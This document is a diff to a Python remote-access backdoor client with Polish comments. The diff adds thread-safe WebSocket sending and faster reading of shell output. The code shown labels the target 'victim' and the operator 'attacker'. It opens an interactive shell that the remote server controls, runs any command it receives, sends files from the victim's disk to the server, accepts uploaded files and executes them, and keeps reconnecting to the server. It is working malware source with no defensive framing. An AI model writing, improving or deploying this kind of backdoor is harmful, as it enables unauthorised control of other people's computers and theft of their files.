@@ -8,6 +8,7 @@ import tempfile
 import threading
 import select
 import sys
+import io
 
 try:
     from websocket import create_connection, WebSocketConnectionClosedException
@@ -30,6 +31,15 @@ pending_upload_filename = None
 terminal_process = None
 terminal_thread = None
 
+# Lock na wysyłanie przez WebSocket (thread-safety)
+ws_lock = threading.Lock()
+
+
+def safe_ws_send(ws, data):
+    """Thread-safe wysyłanie przez WebSocket."""
+    with ws_lock:
+        ws.send(data)
+
 
 def handle_terminal_start(ws):
     """Uruchamia interaktywny shell i streamuje output do attackera."""
@@ -51,7 +61,7 @@ def handle_terminal_start(ws):
             cwd=os.path.expanduser("~")
         )
 
-        ws.send(json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))
+        safe_ws_send(ws, json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))
         print(f"  [⌨] Terminal uruchomiony: {shell_cmd} (PID {terminal_process.pid})")
 
         # Wątek czytający output z procesu i wysyłający do serwera
@@ -59,23 +69,31 @@ def handle_terminal_start(ws):
             global terminal_process
             proc = terminal_process
             try:
+                # Używamy BufferedReader.read1() — czyta tyle ile jest DOSTĘPNE
+                # w buforze, zamiast blokować do pełnych 4096 bajtów.
+                # Na Windows read(4096) może blokować zbyt długo.
+                buffered = io.BufferedReader(proc.stdout, buffer_size=4096)
                 while proc and proc.poll() is None:
-                    data = proc.stdout.read(4096)
+                    try:
+                        data = buffered.read1(4096)
+                    except (ValueError, OSError):
+                        # Pipe zamknięty
+                        break
                     if not data:
                         break
                     try:
                         text = data.decode("utf-8", errors="replace")
-                        ws.send(json.dumps({"type": "terminal_output", "output": text}))
+                        safe_ws_send(ws, json.dumps({"type": "terminal_output", "output": text}))
                     except Exception:
                         break
             except Exception as e:
                 try:
-                    ws.send(json.dumps({"type": "terminal_output", "output": f"\n[terminal zakończony: {e}]\n"}))
+                    safe_ws_send(ws, json.dumps({"type": "terminal_output", "output": f"\n[terminal zakończony: {e}]\n"}))
                 except Exception:
                     pass
             finally:
                 try:
-                    ws.send(json.dumps({"type": "terminal_stopped"}))
+                    safe_ws_send(ws, json.dumps({"type": "terminal_stopped"}))
                 except Exception:
                     pass
 
@@ -83,14 +101,14 @@ def handle_terminal_start(ws):
         terminal_thread.start()
 
     except Exception as e:
-        ws.send(json.dumps({"type": "error", "msg": f"Nie można uruchomić terminala: {e}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nie można uruchomić terminala: {e}"}))
 
 
 def handle_terminal_input(ws, data):
     """Wysyła input do uruchomionego terminala."""
     global terminal_process
     if terminal_process is None or terminal_process.poll() is not None:
-        ws.send(json.dumps({"type": "error", "msg": "Terminal nie jest uruchomiony"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": "Terminal nie jest uruchomiony"}))
         return
 
     user_input = data.get("input", "")
@@ -98,7 +116,7 @@ def handle_terminal_input(ws, data):
         terminal_process.stdin.write((user_input + "\n").encode("utf-8"))
         terminal_process.stdin.flush()
     except Exception as e:
-        ws.send(json.dumps({"type": "error", "msg": f"Błąd zapisu do terminala: {e}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd zapisu do terminala: {e}"}))
 
 
 def handle_terminal_stop(ws):
@@ -121,7 +139,7 @@ def handle_shell(ws, data):
     """Wykonuje polecenie shell i odsyła wynik."""
     command = data.get("command", "")
     if not command:
-        ws.send(json.dumps({"type": "shell_result", "output": "(puste polecenie)"}))
+        safe_ws_send(ws, json.dumps({"type": "shell_result", "output": "(puste polecenie)"}))
         return
 
     try:
@@ -141,7 +159,7 @@ def handle_shell(ws, data):
     except Exception as e:
         output = f"(błąd: {e})"
 
-    ws.send(json.dumps({
+    safe_ws_send(ws, json.dumps({
         "type": "shell_result",
         "command": command,
         "output": output[:50000]  # limit żeby nie wysadzić WebSocket
@@ -152,7 +170,7 @@ def handle_upload(ws, data):
     """Przygotowuje odbiór pliku — właściwy plik przyjdzie jako binary."""
     global pending_upload_filename
     pending_upload_filename = data.get("filename", "uploaded_file.bin")
-    ws.send(json.dumps({
+    safe_ws_send(ws, json.dumps({
         "type": "upload_ready",
         "filename": pending_upload_filename
     }))
@@ -170,39 +188,40 @@ def handle_binary(ws, raw_data):
             f.write(raw_data)
         msg = f"Zapisano plik: {filepath} ({len(raw_data)} bajtów)"
         print(f"  [✓] {msg}")
-        ws.send(json.dumps({"type": "upload_done", "filepath": filepath, "size": len(raw_data)}))
+        safe_ws_send(ws, json.dumps({"type": "upload_done", "filepath": filepath, "size": len(raw_data)}))
     except Exception as e:
-        ws.send(json.dumps({"type": "error", "msg": f"Nie można zapisać pliku: {e}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nie można zapisać pliku: {e}"}))
 
 
 def handle_download(ws, data):
     """Wysyła plik z dysku victima do serwera (→ attacker)."""
     filepath = data.get("filepath", "")
     if not filepath or not os.path.isfile(filepath):
-        ws.send(json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
         return
 
     try:
         filesize = os.path.getsize(filepath)
         # Najpierw info JSON
-        ws.send(json.dumps({
+        safe_ws_send(ws, json.dumps({
             "type": "download_start",
             "filepath": filepath,
             "size": filesize
         }))
         # Potem dane binarne
         with open(filepath, "rb") as f:
-            ws.send_binary(f.read())
+            with ws_lock:
+                ws.send_binary(f.read())
         print(f"  [↑] Wysłano plik: {filepath} ({filesize} B)")
     except Exception as e:
-        ws.send(json.dumps({"type": "error", "msg": f"Błąd odczytu pliku: {e}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd odczytu pliku: {e}"}))
 
 
 def handle_execute(ws, data):
     """Uruchamia plik na komputerze victima."""
     filepath = data.get("filepath", "")
     if not filepath or not os.path.isfile(filepath):
-        ws.send(json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
         return
 
     try:
@@ -221,16 +240,16 @@ def handle_execute(ws, data):
         if not output:
             output = "(brak wyjścia, kod: {})".format(result.returncode)
 
-        ws.send(json.dumps({
+        safe_ws_send(ws, json.dumps({
             "type": "execute_result",
             "filepath": filepath,
             "output": output[:50000]
         }))
         print(f"  [▶] Wykonano: {filepath}")
     except subprocess.TimeoutExpired:
-        ws.send(json.dumps({"type": "execute_result", "filepath": filepath, "output": "(timeout)"}))
+        safe_ws_send(ws, json.dumps({"type": "execute_result", "filepath": filepath, "output": "(timeout)"}))
     except Exception as e:
-        ws.send(json.dumps({"type": "error", "msg": f"Błąd wykonania: {e}"}))
+        safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Błąd wykonania: {e}"}))
 
 
 def connect_loop():
@@ -244,7 +263,7 @@ def connect_loop():
             print(f"[+] Połączono jako '{VICTIM_ID}'")
 
             # Powitanie
-            ws.send(json.dumps({
+            safe_ws_send(ws, json.dumps({
                 "type": "hello",
                 "id": VICTIM_ID,
                 "os": platform.system(),
@@ -286,7 +305,7 @@ def connect_loop():
                 elif msg_type == "terminal_stop":
                     handle_terminal_stop(ws)
                 else:
-                    ws.send(json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))
+                    safe_ws_send(ws, json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))
 
         except WebSocketConnectionClosedException:
             print("[!] Serwer zamknął połączenie")
